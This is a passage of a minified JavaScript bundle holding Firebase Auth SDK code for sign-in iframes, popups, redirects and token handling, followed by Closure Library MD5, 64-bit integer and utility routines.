 */const DR=new So(5e3,15e3),bR="__/auth/iframe",VR="emulator/auth/iframe",OR={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},LR=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function MR(t){const e=t.config;Y(e.authDomain,t,"auth-domain-config-required");const n=e.emulator?$d(e,VR):`https://${t.config.authDomain}/${bR}`,r={apiKey:e.apiKey,appName:t.name,v:$i},i=LR.get(t.config.apiHost);i&&(r.eid=i);const s=t._getFrameworks();return s.length&&(r.fw=s.join(",")),`${n}?${Io(r).slice(1)}`}async function FR(t){const e=await NR(t),n=Jt().gapi;return Y(n,t,"internal-error"),e.open({where:document.body,url:MR(t),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:OR,dontclear:!0},r=>new Promise(async(i,s)=>{await r.restyle({setHideOnLeave:!1});const o=Xt(t,"network-request-failed"),l=Jt().setTimeout(()=>{s(o)},DR.get());function u(){Jt().clearTimeout(l),i(r)}r.ping(u).then(u,()=>{s(o)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const UR={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},jR=500,zR=600,BR="_blank",$R="http://localhost";class yg{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function WR(t,e,n,r=jR,i=zR){const s=Math.max((window.screen.availHeight-i)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString();let l="";const u=Object.assign(Object.assign({},UR),{width:r.toString(),height:i.toString(),top:s,left:o}),h=tt().toLowerCase();n&&(l=o0(h)?BR:n),i0(h)&&(e=e||$R,u.scrollbars="yes");const f=Object.entries(u).reduce((g,[v,A])=>`${g}${v}=${A},`,"");if(CC(h)&&l!=="_self")return qR(e||"",l),new yg(null);const p=window.open(e||"",l,f);Y(p,t,"popup-blocked");try{p.focus()}catch{}return new yg(p)}function qR(t,e){const n=document.createElement("a");n.href=t,n.target=e;const r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(r)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const HR="__/auth/handler",GR="emulator/auth/handler",KR=encodeURIComponent("fac");async function vg(t,e,n,r,i,s){Y(t.config.authDomain,t,"auth-domain-config-required"),Y(t.config.apiKey,t,"invalid-api-key");const o={apiKey:t.config.apiKey,appName:t.name,authType:n,redirectUrl:r,v:$i,eventId:i};if(e instanceof m0){e.setDefaultLanguage(t.languageCode),o.providerId=e.providerId||"",YA(e.getCustomParameters())||(o.customParameters=JSON.stringify(e.getCustomParameters()));for(const[f,p]of Object.entries({}))o[f]=p}if(e instanceof Ao){const f=e.getScopes().filter(p=>p!=="");f.length>0&&(o.scopes=f.join(","))}t.tenantId&&(o.tid=t.tenantId);const l=o;for(const f of Object.keys(l))l[f]===void 0&&delete l[f];const u=await t._getAppCheckToken(),h=u?`#${KR}=${encodeURIComponent(u)}`:"";return`${QR(t)}?${Io(l).slice(1)}${h}`}function QR({config:t}){return t.emulator?$d(t,GR):`https://${t.authDomain}/${HR}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mc="webStorageSupport";class YR{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=w0,this._completeRedirectFn=wR,this._overrideRedirectResult=yR}async _openPopup(e,n,r,i){var s;Sn((s=this.eventManagers[e._key()])===null||s===void 0?void 0:s.manager,"_initialize() not called before _openPopup()");const o=await vg(e,n,r,Eh(),i);return WR(e,o,Qd())}async _openRedirect(e,n,r,i){await this._originValidation(e);const s=await vg(e,n,r,Eh(),i);return ZC(s),new Promise(()=>{})}_initialize(e){const n=e._key();if(this.eventManagers[n]){const{manager:i,promise:s}=this.eventManagers[n];return i?Promise.resolve(i):(Sn(s,"If manager is not set, promise should be"),s)}const r=this.initAndGetManager(e);return this.eventManagers[n]={promise:r},r.catch(()=>{delete this.eventManagers[n]}),r}async initAndGetManager(e){const n=await FR(e),r=new TR(e);return n.register("authEvent",i=>(Y(i==null?void 0:i.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=n,r}_isIframeWebStorageSupported(e,n){this.iframes[e._key()].send(mc,{type:mc},i=>{var s;const o=(s=i==null?void 0:i[0])===null||s===void 0?void 0:s[mc];o!==void 0&&n(!!o),In(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const n=e._key();return this.originValidationPromises[n]||(this.originValidationPromises[n]=RR(e)),this.originValidationPromises[n]}get _shouldInitProactively(){return h0()||s0()||Hd()}}const XR=YR;var _g="@firebase/auth",wg="1.7.9";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class JR{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const n=this.auth.onIdTokenChanged(r=>{e((r==null?void 0:r.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,n),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const n=this.internalListeners.get(e);n&&(this.internalListeners.delete(e),n(),this.updateProactiveRefresh())}assertAuthConfigured(){Y(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ZR(t){switch(t){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function ex(t){Pi(new Or("auth",(e,{options:n})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),s=e.getProvider("app-check-internal"),{apiKey:o,authDomain:l}=r.options;Y(o&&!o.includes(":"),"invalid-api-key",{appName:r.name});const u={apiKey:o,authDomain:l,clientPlatform:t,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:d0(t)},h=new DC(r,i,s,u);return FC(h,n),h},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,n,r)=>{e.getProvider("auth-internal").initialize()})),Pi(new Or("auth-internal",e=>{const n=Gd(e.getProvider("auth").getImmediate());return(r=>new JR(r))(n)},"PRIVATE").setInstantiationMode("EXPLICIT")),rr(_g,wg,ZR(t)),rr(_g,wg,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tx=5*60,nx=B_("authIdTokenMaxAge")||tx;let Eg=null;const rx=t=>async e=>{const n=e&&await e.getIdTokenResult(),r=n&&(new Date().getTime()-Date.parse(n.issuedAtTime))/1e3;if(r&&r>nx)return;const i=n==null?void 0:n.token;Eg!==i&&(Eg=i,await fetch(t,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function ix(t=H_()){const e=jd(t,"auth");if(e.isInitialized())return e.getImmediate();const n=MC(t,{popupRedirectResolver:XR,persistence:[lR,YC,w0]}),r=B_("authTokenSyncURL");if(r&&typeof isSecureContext=="boolean"&&isSecureContext){const s=new URL(r,location.origin);if(location.origin===s.origin){const o=rx(s.toString());GC(n,o,()=>o(n.currentUser)),HC(n,l=>o(l))}}const i=j_("auth");return i&&UC(n,`http://${i}`),n}function sx(){var t,e;return(e=(t=document.getElementsByTagName("head"))===null||t===void 0?void 0:t[0])!==null&&e!==void 0?e:document}bC({loadJS(t){return new Promise((e,n)=>{const r=document.createElement("script");r.setAttribute("src",t),r.onload=e,r.onerror=i=>{const s=Xt("internal-error");s.customData=i,n(s)},r.type="text/javascript",r.charset="UTF-8",sx().appendChild(r)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});ex("Browser");var Tg=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var kr,R0;(function(){var t;/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/function e(I,y){function T(){}T.prototype=y.prototype,I.D=y.prototype,I.prototype=new T,I.prototype.constructor=I,I.C=function(C,P,x){for(var w=Array(arguments.length-2),he=2;he<arguments.length;he++)w[he-2]=arguments[he];return y.prototype[P].apply(C,w)}}function n(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(r,n),r.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(I,y,T){T||(T=0);var C=Array(16);if(typeof y=="string")for(var P=0;16>P;++P)C[P]=y.charCodeAt(T++)|y.charCodeAt(T++)<<8|y.charCodeAt(T++)<<16|y.charCodeAt(T++)<<24;else for(P=0;16>P;++P)C[P]=y[T++]|y[T++]<<8|y[T++]<<16|y[T++]<<24;y=I.g[0],T=I.g[1],P=I.g[2];var x=I.g[3],w=y+(x^T&(P^x))+C[0]+3614090360&4294967295;y=T+(w<<7&4294967295|w>>>25),w=x+(P^y&(T^P))+C[1]+3905402710&4294967295,x=y+(w<<12&4294967295|w>>>20),w=P+(T^x&(y^T))+C[2]+606105819&4294967295,P=x+(w<<17&4294967295|w>>>15),w=T+(y^P&(x^y))+C[3]+3250441966&4294967295,T=P+(w<<22&4294967295|w>>>10),w=y+(x^T&(P^x))+C[4]+4118548399&4294967295,y=T+(w<<7&4294967295|w>>>25),w=x+(P^y&(T^P))+C[5]+1200080426&4294967295,x=y+(w<<12&4294967295|w>>>20),w=P+(T^x&(y^T))+C[6]+2821735955&4294967295,P=x+(w<<17&4294967295|w>>>15),w=T+(y^P&(x^y))+C[7]+4249261313&4294967295,T=P+(w<<22&4294967295|w>>>10),w=y+(x^T&(P^x))+C[8]+1770035416&4294967295,y=T+(w<<7&4294967295|w>>>25),w=x+(P^y&(T^P))+C[9]+2336552879&4294967295,x=y+(w<<12&4294967295|w>>>20),w=P+(T^x&(y^T))+C[10]+4294925233&4294967295,P=x+(w<<17&4294967295|w>>>15),w=T+(y^P&(x^y))+C[11]+2304563134&4294967295,T=P+(w<<22&4294967295|w>>>10),w=y+(x^T&(P^x))+C[12]+1804603682&4294967295,y=T+(w<<7&4294967295|w>>>25),w=x+(P^y&(T^P))+C[13]+4254626195&4294967295,x=y+(w<<12&4294967295|w>>>20),w=P+(T^x&(y^T))+C[14]+2792965006&4294967295,P=x+(w<<17&4294967295|w>>>15),w=T+(y^P&(x^y))+C[15]+1236535329&4294967295,T=P+(w<<22&4294967295|w>>>10),w=y+(P^x&(T^P))+C[1]+4129170786&4294967295,y=T+(w<<5&4294967295|w>>>27),w=x+(T^P&(y^T))+C[6]+3225465664&4294967295,x=y+(w<<9&4294967295|w>>>23),w=P+(y^T&(x^y))+C[11]+643717713&4294967295,P=x+(w<<14&4294967295|w>>>18),w=T+(x^y&(P^x))+C[0]+3921069994&4294967295,T=P+(w<<20&4294967295|w>>>12),w=y+(P^x&(T^P))+C[5]+3593408605&4294967295,y=T+(w<<5&4294967295|w>>>27),w=x+(T^P&(y^T))+C[10]+38016083&4294967295,x=y+(w<<9&4294967295|w>>>23),w=P+(y^T&(x^y))+C[15]+3634488961&4294967295,P=x+(w<<14&4294967295|w>>>18),w=T+(x^y&(P^x))+C[4]+3889429448&4294967295,T=P+(w<<20&4294967295|w>>>12),w=y+(P^x&(T^P))+C[9]+568446438&4294967295,y=T+(w<<5&4294967295|w>>>27),w=x+(T^P&(y^T))+C[14]+3275163606&4294967295,x=y+(w<<9&4294967295|w>>>23),w=P+(y^T&(x^y))+C[3]+4107603335&4294967295,P=x+(w<<14&4294967295|w>>>18),w=T+(x^y&(P^x))+C[8]+1163531501&4294967295,T=P+(w<<20&4294967295|w>>>12),w=y+(P^x&(T^P))+C[13]+2850285829&4294967295,y=T+(w<<5&4294967295|w>>>27),w=x+(T^P&(y^T))+C[2]+4243563512&4294967295,x=y+(w<<9&4294967295|w>>>23),w=P+(y^T&(x^y))+C[7]+1735328473&4294967295,P=x+(w<<14&4294967295|w>>>18),w=T+(x^y&(P^x))+C[12]+2368359562&4294967295,T=P+(w<<20&4294967295|w>>>12),w=y+(T^P^x)+C[5]+4294588738&4294967295,y=T+(w<<4&4294967295|w>>>28),w=x+(y^T^P)+C[8]+2272392833&4294967295,x=y+(w<<11&4294967295|w>>>21),w=P+(x^y^T)+C[11]+1839030562&4294967295,P=x+(w<<16&4294967295|w>>>16),w=T+(P^x^y)+C[14]+4259657740&4294967295,T=P+(w<<23&4294967295|w>>>9),w=y+(T^P^x)+C[1]+2763975236&4294967295,y=T+(w<<4&4294967295|w>>>28),w=x+(y^T^P)+C[4]+1272893353&4294967295,x=y+(w<<11&4294967295|w>>>21),w=P+(x^y^T)+C[7]+4139469664&4294967295,P=x+(w<<16&4294967295|w>>>16),w=T+(P^x^y)+C[10]+3200236656&4294967295,T=P+(w<<23&4294967295|w>>>9),w=y+(T^P^x)+C[13]+681279174&4294967295,y=T+(w<<4&4294967295|w>>>28),w=x+(y^T^P)+C[0]+3936430074&4294967295,x=y+(w<<11&4294967295|w>>>21),w=P+(x^y^T)+C[3]+3572445317&4294967295,P=x+(w<<16&4294967295|w>>>16),w=T+(P^x^y)+C[6]+76029189&4294967295,T=P+(w<<23&4294967295|w>>>9),w=y+(T^P^x)+C[9]+3654602809&4294967295,y=T+(w<<4&4294967295|w>>>28),w=x+(y^T^P)+C[12]+3873151461&4294967295,x=y+(w<<11&4294967295|w>>>21),w=P+(x^y^T)+C[15]+530742520&4294967295,P=x+(w<<16&4294967295|w>>>16),w=T+(P^x^y)+C[2]+3299628645&4294967295,T=P+(w<<23&4294967295|w>>>9),w=y+(P^(T|~x))+C[0]+4096336452&4294967295,y=T+(w<<6&4294967295|w>>>26),w=x+(T^(y|~P))+C[7]+1126891415&4294967295,x=y+(w<<10&4294967295|w>>>22),w=P+(y^(x|~T))+C[14]+2878612391&4294967295,P=x+(w<<15&4294967295|w>>>17),w=T+(x^(P|~y))+C[5]+4237533241&4294967295,T=P+(w<<21&4294967295|w>>>11),w=y+(P^(T|~x))+C[12]+1700485571&4294967295,y=T+(w<<6&4294967295|w>>>26),w=x+(T^(y|~P))+C[3]+2399980690&4294967295,x=y+(w<<10&4294967295|w>>>22),w=P+(y^(x|~T))+C[10]+4293915773&4294967295,P=x+(w<<15&4294967295|w>>>17),w=T+(x^(P|~y))+C[1]+2240044497&4294967295,T=P+(w<<21&4294967295|w>>>11),w=y+(P^(T|~x))+C[8]+1873313359&4294967295,y=T+(w<<6&4294967295|w>>>26),w=x+(T^(y|~P))+C[15]+4264355552&4294967295,x=y+(w<<10&4294967295|w>>>22),w=P+(y^(x|~T))+C[6]+2734768916&4294967295,P=x+(w<<15&4294967295|w>>>17),w=T+(x^(P|~y))+C[13]+1309151649&4294967295,T=P+(w<<21&4294967295|w>>>11),w=y+(P^(T|~x))+C[4]+4149444226&4294967295,y=T+(w<<6&4294967295|w>>>26),w=x+(T^(y|~P))+C[11]+3174756917&4294967295,x=y+(w<<10&4294967295|w>>>22),w=P+(y^(x|~T))+C[2]+718787259&4294967295,P=x+(w<<15&4294967295|w>>>17),w=T+(x^(P|~y))+C[9]+3951481745&4294967295,I.g[0]=I.g[0]+y&4294967295,I.g[1]=I.g[1]+(P+(w<<21&4294967295|w>>>11))&4294967295,I.g[2]=I.g[2]+P&4294967295,I.g[3]=I.g[3]+x&4294967295}r.prototype.u=function(I,y){y===void 0&&(y=I.length);for(var T=y-this.blockSize,C=this.B,P=this.h,x=0;x<y;){if(P==0)for(;x<=T;)i(this,I,x),x+=this.blockSize;if(typeof I=="string"){for(;x<y;)if(C[P++]=I.charCodeAt(x++),P==this.blockSize){i(this,C),P=0;break}}else for(;x<y;)if(C[P++]=I[x++],P==this.blockSize){i(this,C),P=0;break}}this.h=P,this.o+=y},r.prototype.v=function(){var I=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);I[0]=128;for(var y=1;y<I.length-8;++y)I[y]=0;var T=8*this.o;for(y=I.length-8;y<I.length;++y)I[y]=T&255,T/=256;for(this.u(I),I=Array(16),y=T=0;4>y;++y)for(var C=0;32>C;C+=8)I[T++]=this.g[y]>>>C&255;return I};function s(I,y){var T=l;return Object.prototype.hasOwnProperty.call(T,I)?T[I]:T[I]=y(I)}function o(I,y){this.h=y;for(var T=[],C=!0,P=I.length-1;0<=P;P--){var x=I[P]|0;C&&x==y||(T[P]=x,C=!1)}this.g=T}var l={};function u(I){return-128<=I&&128>I?s(I,function(y){return new o([y|0],0>y?-1:0)}):new o([I|0],0>I?-1:0)}function h(I){if(isNaN(I)||!isFinite(I))return p;if(0>I)return N(h(-I));for(var y=[],T=1,C=0;I>=T;C++)y[C]=I/T|0,T*=4294967296;return new o(y,0)}function f(I,y){if(I.length==0)throw Error("number format error: empty string");if(y=y||10,2>y||36<y)throw Error("radix out of range: "+y);if(I.charAt(0)=="-")return N(f(I.substring(1),y));if(0<=I.indexOf("-"))throw Error('number format error: interior "-" character');for(var T=h(Math.pow(y,8)),C=p,P=0;P<I.length;P+=8){var x=Math.min(8,I.length-P),w=parseInt(I.substring(P,P+x),y);8>x?(x=h(Math.pow(y,x)),C=C.j(x).add(h(w))):(C=C.j(T),C=C.add(h(w)))}return C}var p=u(0),g=u(1),v=u(16777216);t=o.prototype,t.m=function(){if(k(this))return-N(this).m();for(var I=0,y=1,T=0;T<this.g.length;T++){var C=this.i(T);I+=(0<=C?C:4294967296+C)*y,y*=4294967296}return I},t.toString=function(I){if(I=I||10,2>I||36<I)throw Error("radix out of range: "+I);if(A(this))return"0";if(k(this))return"-"+N(this).toString(I);for(var y=h(Math.pow(I,6)),T=this,C="";;){var P=V(T,y).g;T=S(T,P.j(y));var x=((0<T.g.length?T.g[0]:T.h)>>>0).toString(I);if(T=P,A(T))return x+C;for(;6>x.length;)x="0"+x;C=x+C}},t.i=function(I){return 0>I?0:I<this.g.length?this.g[I]:this.h};function A(I){if(I.h!=0)return!1;for(var y=0;y<I.g.length;y++)if(I.g[y]!=0)return!1;return!0}function k(I){return I.h==-1}t.l=function(I){return I=S(this,I),k(I)?-1:A(I)?0:1};function N(I){for(var y=I.g.length,T=[],C=0;C<y;C++)T[C]=~I.g[C];return new o(T,~I.h).add(g)}t.abs=function(){return k(this)?N(this):this},t.add=function(I){for(var y=Math.max(this.g.length,I.g.length),T=[],C=0,P=0;P<=y;P++){var x=C+(this.i(P)&65535)+(I.i(P)&65535),w=(x>>>16)+(this.i(P)>>>16)+(I.i(P)>>>16);C=w>>>16,x&=65535,w&=65535,T[P]=w<<16|x}return new o(T,T[T.length-1]&-2147483648?-1:0)};function S(I,y){return I.add(N(y))}t.j=function(I){if(A(this)||A(I))return p;if(k(this))return k(I)?N(this).j(N(I)):N(N(this).j(I));if(k(I))return N(this.j(N(I)));if(0>this.l(v)&&0>I.l(v))return h(this.m()*I.m());for(var y=this.g.length+I.g.length,T=[],C=0;C<2*y;C++)T[C]=0;for(C=0;C<this.g.length;C++)for(var P=0;P<I.g.length;P++){var x=this.i(C)>>>16,w=this.i(C)&65535,he=I.i(P)>>>16,Ct=I.i(P)&65535;T[2*C+2*P]+=w*Ct,_(T,2*C+2*P),T[2*C+2*P+1]+=x*Ct,_(T,2*C+2*P+1),T[2*C+2*P+1]+=w*he,_(T,2*C+2*P+1),T[2*C+2*P+2]+=x*he,_(T,2*C+2*P+2)}for(C=0;C<y;C++)T[C]=T[2*C+1]<<16|T[2*C];for(C=y;C<2*y;C++)T[C]=0;return new o(T,0)};function _(I,y){for(;(I[y]&65535)!=I[y];)I[y+1]+=I[y]>>>16,I[y]&=65535,y++}function R(I,y){this.g=I,this.h=y}function V(I,y){if(A(y))throw Error("division by zero");if(A(I))return new R(p,p);if(k(I))return y=V(N(I),y),new R(N(y.g),N(y.h));if(k(y))return y=V(I,N(y)),new R(N(y.g),y.h);if(30<I.g.length){if(k(I)||k(y))throw Error("slowDivide_ only works with positive integers.");for(var T=g,C=y;0>=C.l(I);)T=U(T),C=U(C);var P=j(T,1),x=j(C,1);for(C=j(C,2),T=j(T,2);!A(C);){var w=x.add(C);0>=w.l(I)&&(P=P.add(T),x=w),C=j(C,1),T=j(T,1)}return y=S(I,P.j(y)),new R(P,y)}for(P=p;0<=I.l(y);){for(T=Math.max(1,Math.floor(I.m()/y.m())),C=Math.ceil(Math.log(T)/Math.LN2),C=48>=C?1:Math.pow(2,C-48),x=h(T),w=x.j(y);k(w)||0<w.l(I);)T-=C,x=h(T),w=x.j(y);A(x)&&(x=g),P=P.add(x),I=S(I,w)}return new R(P,I)}t.A=function(I){return V(this,I).h},t.and=function(I){for(var y=Math.max(this.g.length,I.g.length),T=[],C=0;C<y;C++)T[C]=this.i(C)&I.i(C);return new o(T,this.h&I.h)},t.or=function(I){for(var y=Math.max(this.g.length,I.g.length),T=[],C=0;C<y;C++)T[C]=this.i(C)|I.i(C);return new o(T,this.h|I.h)},t.xor=function(I){for(var y=Math.max(this.g.length,I.g.length),T=[],C=0;C<y;C++)T[C]=this.i(C)^I.i(C);return new o(T,this.h^I.h)};function U(I){for(var y=I.g.length+1,T=[],C=0;C<y;C++)T[C]=I.i(C)<<1|I.i(C-1)>>>31;return new o(T,I.h)}function j(I,y){var T=y>>5;y%=32;for(var C=I.g.length-T,P=[],x=0;x<C;x++)P[x]=0<y?I.i(x+T)>>>y|I.i(x+T+1)<<32-y:I.i(x+T);return new o(P,I.h)}r.prototype.digest=r.prototype.v,r.prototype.reset=r.prototype.s,r.prototype.update=r.prototype.u,R0=r,o.prototype.add=o.prototype.add,o.prototype.multiply=o.prototype.j,o.prototype.modulo=o.prototype.A,o.prototype.compare=o.prototype.l,o.prototype.toNumber=o.prototype.m,o.prototype.toString=o.prototype.toString,o.prototype.getBits=o.prototype.i,o.fromNumber=h,o.fromString=f,kr=o}).apply(typeof Tg<"u"?Tg:typeof self<"u"?self:typeof window<"u"?window:{});var ya=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var x0,Ts,k0,Fa,Sh,P0,N0,D0;(function(){var t,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(a,c,d){return a==Array.prototype||a==Object.prototype||(a[c]=d.value),a};function n(a){a=[typeof globalThis=="object"&&globalThis,a,typeof window=="object"&&window,typeof self=="object"&&self,typeof ya=="object"&&ya];for(var c=0;c<a.length;++c){var d=a[c];if(d&&d.Math==Math)return d}throw Error("Cannot find global object")}var r=n(this);function i(a,c){if(c)e:{var d=r;a=a.split(".");for(var m=0;m<a.length-1;m++){var D=a[m];if(!(D in d))break e;d=d[D]}a=a[a.length-1],m=d[a],c=c(m),c!=m&&c!=null&&e(d,a,{configurable:!0,writable:!0,value:c})}}function s(a,c){a instanceof String&&(a+="");var d=0,m=!1,D={next:function(){if(!m&&d<a.length){var b=d++;return{value:c(b,a[b]),done:!1}}return m=!0,{done:!0,value:void 0}}};return D[Symbol.iterator]=function(){return D},D}i("Array.prototype.values",function(a){return a||function(){return s(this,function(c,d){return d})}});/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/var o=o||{},l=this||self;function u(a){var c=typeof a;return c=c!="object"?c:a?Array.isArray(a)?"array":c:"null",c=="array"||c=="object"&&typeof a.length=="number"}function h(a){var c=typeof a;return c=="object"&&a!=null||c=="function"}function f(a,c,d){return a.call.apply(a.bind,arguments)}function p(a,c,d){if(!a)throw Error();if(2<arguments.length){var m=Array.prototype.slice.call(arguments,2);return function(){var D=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(D,m),a.apply(c,D)}}return function(){return a.apply(c,arguments)}}function g(a,c,d){return g=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?f:p,g.apply(null,arguments)}function v(a,c){var d=Array.prototype.slice.call(arguments,1);return function(){var m=d.slice();return m.push.apply(m,arguments),a.apply(this,m)}}function A(a,c){function d(){}d.prototype=c.prototype,a.aa=c.prototype,a.prototype=new d,a.prototype.constructor=a,a.Qb=function(m,D,b){for(var z=Array(arguments.length-2),de=2;de<arguments.length;de++)z[de-2]=arguments[de];return c.prototype[D].apply(m,z)}}function k(a){const c=a.length;if(0<c){const d=Array(c);for(let m=0;m<c;m++)d[m]=a[m];return d}return[]}function N(a,c){for(let d=1;d<arguments.length;d++){const m=arguments[d];if(u(m)){const D=a.length||0,b=m.length||0;a.length=D+b;for(let z=0;z<b;z++)a[D+z]=m[z]}else a.push(m)}}class S{constructor(c,d){this.i=c,this.j=d,this.h=0,this.g=null}get(){let c;return 0<this.h?(this.h--,c=this.g,this.g=c.next,c.next=null):c=this.i(),c}}function _(a){return/^[\s\xa0]*$/.test(a)}function R(){var a=l.navigator;return a&&(a=a.userAgent)?a:""}function V(a){return V[" "](a),a}V[" "]=function(){};var U=R().indexOf("Gecko")!=-1&&!(R().toLowerCase().indexOf("webkit")!=-1&&R().indexOf("Edge")==-1)&&!(R().indexOf("Trident")!=-1||R().indexOf("MSIE")!=-1)&&R().indexOf("Edge")==-1;function j(a,c,d){for(const m in a)c.call(d,a[m],m,a)}function I(a,c){for(const d in a)c.call(void 0,a[d],d,a)}function y(a){const c={};for(const d in a)c[d]=a[d];return c}const T="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function C(a,c){let d,m;for(let D=1;D<arguments.length;D++){m=arguments[D];for(d in m)a[d]=m[d];for(let b=0;b<T.length;b++)d=T[b],Object.prototype.hasOwnProperty.call(m,d)&&(a[d]=m[d])}}function P(a){var c=1;a=a.split(":");const d=[];for(;0<c&&a.length;)d.push(a.shift()),c--;return a.length&&d.push(a.join(":")),d}function x(a){l.setTimeout(()=>{throw a},0)}function w(){var a=Q;let c=null;return a.g&&(c=a.g,a.g=a.g.next,a.g||(a.h=null),c.next=null),c}class he{constructor(){this.h=this.g=null}add(c,d){const m=Ct.get();m.set(c,d),this.h?this.h.next=m:this.g=m,this.h=m}}var Ct=new S(()=>new Vt,a=>a.reset());class Vt{constructor(){this.next=this.g=this.h=null}set(c,d){this.h=c,this.g=d,this.next=null}reset(){this.next=this.g=this.h=null}}let ct,$=!1,Q=new he,B=()=>{const a=l.Promise.resolve(void 0);ct=()=>{a.then(W)}};var W=()=>{for(var a;a=w();){try{a.h.call(a.g)}catch(d){x(d)}var 